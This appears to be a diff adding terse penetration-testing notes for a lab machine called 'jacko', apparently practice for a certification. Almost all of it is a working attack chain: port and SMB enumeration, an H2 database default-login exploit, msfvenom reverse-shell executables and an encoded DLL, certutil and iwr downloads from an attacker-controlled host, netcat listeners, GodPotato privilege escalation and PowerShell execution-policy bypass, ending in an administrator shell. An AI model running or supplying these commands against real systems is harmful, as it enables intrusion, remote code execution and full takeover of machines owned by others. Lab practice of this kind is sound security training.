@@ -1,0 +1,46 @@
+jacko
+
+ 192.168.214.66
+
+sudo nmap -Pn -n 192.168.214.66 -sC -sV -p- --open
+
+smbclient -N -L \\\\192.168.214.66\\
+enum4linux 192.168.214.66
+
+http://192.168.214.66:8082
+login 
+default using sa withoutpassword
+
+ H2 1.4.199 (2019-03-13)
+ https://www.exploit-db.com/exploits/49384
+ all code run successfully
+ try to find system info
+ x64 architecture
+ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.153 LPORT=135 -f exe > shell.exe
+ python -m http.server 444 
+ nc -nvlp 135 
+
+"certutil -split -urlcache -f http://192.168.45.153:444/shell.exe C:\\Users\\tony\\shell.exe"
+"C:\\Users\\tony\\shell.exe"
+got shell
+C:\Windows\System32
+whoami
+set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
+powershell
+Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse
+iwr http://192.168.45.153:444/GodPotato-NET4.exe -outfile GodPotato-NET4.exe
+cd C:\users\tony
+iwr http://192.168.45.153:444/GodPotato-NET4.exe -outfile GodPotato-NET4.exe
+.\GodPotato-NET4.exe -cmd "whoami"
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.153 LPORT=135 -f exe > shell2.exe
+iwr http://192.168.45.153:444/shell2.exe -outfile shell2.exe
+.\GodPotato-NET4.exe -cmd "dir C:\users\Administrator\Desktop"
+
+not getting shell again 
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.153 LPORT=4445 -f dll -a x86 --platform windows -e x86/xor_dynamic -b '\x00' -o 0xBEN_privesc.dll
+iwr http://192.168.45.153:444/0xBEN_privesc.dll -outfile 0xBEN_privesc.dll
+iwr http://192.168.45.153:444/shell3.ps1 -outfile shell3.ps1
+powershell -nop -ep bypass -f C:\Users\tony\shell3.ps1
+nc -nvlp 4445
+
+got admin shell
